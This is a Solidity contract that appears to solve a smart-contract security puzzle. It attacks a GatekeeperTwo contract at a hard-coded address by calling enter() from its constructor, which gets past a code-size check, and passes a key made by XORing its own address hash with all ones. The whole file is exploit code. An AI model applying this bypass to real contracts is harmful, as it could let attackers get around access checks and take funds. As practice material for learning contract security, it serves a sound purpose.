// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


import "./gatekeepertwo.sol";

contract HackGatekeeperTwo {
    
  constructor() public {
    GatekeeperTwo gateKeeperTwo = GatekeeperTwo(0x069494471A9F81652539fd51155aC2d9E4b5e101);
    bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
    (bool s, ) = address(gateKeeperTwo).call(abi.encodeWithSignature("enter(bytes8)", gateKey));
    require(s, "failed");
  }
}